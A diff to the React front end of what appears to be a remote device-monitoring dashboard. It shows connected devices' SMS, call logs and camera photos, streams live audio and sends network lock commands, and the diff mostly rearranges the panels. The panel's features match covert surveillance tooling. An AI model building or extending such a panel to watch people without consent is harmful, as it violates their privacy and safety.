@@ -1,7 +1,6 @@
 import { useState, useCallback, useEffect, useRef, memo } from 'react';
 import { ControlButtons } from './components/dashboard/ControlButtons';
 import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel';
-import { NetworkProfile } from './components/dashboard/NetworkProfile';
 import { SMSPanel } from './components/dashboard/SMSPanel';
 import { CallsPanel } from './components/dashboard/CallsPanel';
 import { EventLog } from './components/dashboard/EventLog';
@@ -39,7 +38,7 @@ function App() {
   const {
     wsState, isColdStarting, devices, selectedDevice, selectedDeviceId,
     feed, photos, pendingCommands, toasts, wsReconnectAt,
-    setSelectedDeviceId, sendCommand, reconnectNow, ws,
+    setSelectedDeviceId, sendCommand, reconnectNow,
   } = useDashboard(handleAudioData);
 
   const [isListening, setIsListening] = useState(false);
@@ -188,6 +187,7 @@ function App() {
               </span>
               <StatusTag label="Status" value={audioPlayback.state.playbackStatus || 'Live'} tone={audioPlayback.state.playbackStatus === 'Lagging' ? 'warn' : 'good'} />
               {(audioPlayback.state.lowNetwork || health?.lowNetwork) && <StatusTag label="Net" value="Low-BW" tone="warn" />}
+              {(audioPlayback.state.droppingPackets || health?.droppingPackets) && <StatusTag label="Packets" value="Dropping" tone="warn" />}
               <div style={{ flex: 1, height: 1, background: 'rgba(16,185,129,0.12)' }} />
               <LiveBeatBars />
             </div>
@@ -262,31 +262,9 @@ function App() {
 
             {selectedDevice && (
               <>
-                {/* Network profile strip */}
-                <NetworkProfile
-                  lowNetwork={health?.lowNetwork}
-                  streamCodec={health?.streamCodec}
-                  streamCodecMode={health?.streamCodecMode}
-                  onForceToggle={() => handleCommand('set_low_network', { enabled: !health?.lowNetwork })}
-                  isStreaming={isStreaming}
-                  connQuality={health?.connQuality}
-                  netType={health?.netType}
-                  isConnected={isConnected}
-                  deviceId={selectedDeviceId}
-                  pendingCommands={pendingCommands}
-                />
-
-                {/* ── Top row: Device Info + Controls ─────────── */}
-                <div className="grid grid-cols-1 xl:grid-cols-[3fr_2fr] gap-4">
-                  {/* Left — Device Info + Event Log */}
-                  <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
+                <div className="dashboard-layout">
+                  <div className="dashboard-left">
                     <DeviceInfoPanel device={selectedDevice} audioState={audioPlayback.state} />
-                    <EventLog events={feed} />
-                  </div>
-
-                  {/* Right — Controls */}
-                  <div className="glass-card" style={{ padding: 16 }}>
-                    <div className="section-label">Controls</div>
                     <ControlButtons
                       onCommand={handleCommand}
                       health={selectedDevice?.health}
@@ -295,40 +273,43 @@ function App() {
                       deviceId={selectedDeviceId}
                       pendingCommands={pendingCommands}
                     />
-
-                    {/* Network Lock */}
-                    <div style={{ marginTop: 16, paddingTop: 14, borderTop: '1px solid rgba(63,63,70,0.3)' }}>
+                    <div className="panel-shell">
+                      <div className="panel-title-row">
+                        <div>
+                          <div className="eyebrow">Device Status</div>
+                          <h2>Network Guard</h2>
+                        </div>
+                        <span className={`status-pill ${health?.networkLocked ? 'bad' : 'good'}`}>
+                          {health?.networkLocked ? 'Locked' : 'Open'}
+                        </span>
+                      </div>
                       <button
+                        className="primary-command"
                         onClick={() => handleCommand(health?.networkLocked ? 'unlock_network' : 'lock_network')}
                         disabled={lockDisabled}
-                        style={{
-                          width: '100%', padding: '10px 14px', borderRadius: 12,
-                          fontSize: 12, fontWeight: 700, cursor: lockDisabled ? 'not-allowed' : 'pointer',
-                          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6,
-                          background: health?.networkLocked ? 'rgba(239,68,68,0.08)' : 'rgba(16,185,129,0.08)',
-                          border: `1px solid ${health?.networkLocked ? 'rgba(239,68,68,0.3)' : 'rgba(16,185,129,0.3)'}`,
-                          color: health?.networkLocked ? '#f87171' : '#34d399',
-                          transition: 'all 0.2s', opacity: lockDisabled ? 0.5 : 1,
-                        }}
+                        type="button"
                       >
-                        {health?.networkLocked ? '🔓 Unlock Device Network' : '🔒 Lock Device Network'}
+                        {health?.networkLocked ? 'Unlock Device Network' : 'Lock Device Network'}
                       </button>
                     </div>
+                    <EventLog events={feed} />
                   </div>
-                </div>
 
-                {/* ── Camera + SMS + Calls row ────────────────── */}
-                <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
-                  <CameraPanel
-                    photos={photos}
-                    onCommand={handleCommand}
-                    health={health}
-                    isConnected={isConnected}
-                    deviceId={selectedDeviceId}
-                    pendingCommands={pendingCommands}
-                  />
-                  <SMSPanel messages={selectedDevice?.sms || []} />
-                  <CallsPanel calls={selectedDevice?.calls || []} />
+                  <div className="dashboard-center">
+                    <CameraPanel
+                      photos={photos}
+                      onCommand={handleCommand}
+                      health={health}
+                      isConnected={isConnected}
+                      deviceId={selectedDeviceId}
+                      pendingCommands={pendingCommands}
+                    />
+                  </div>
+
+                  <div className="dashboard-right">
+                    <SMSPanel messages={selectedDevice?.sms || []} />
+                    <CallsPanel calls={selectedDevice?.calls || []} />
+                  </div>
                 </div>
               </>
             )}
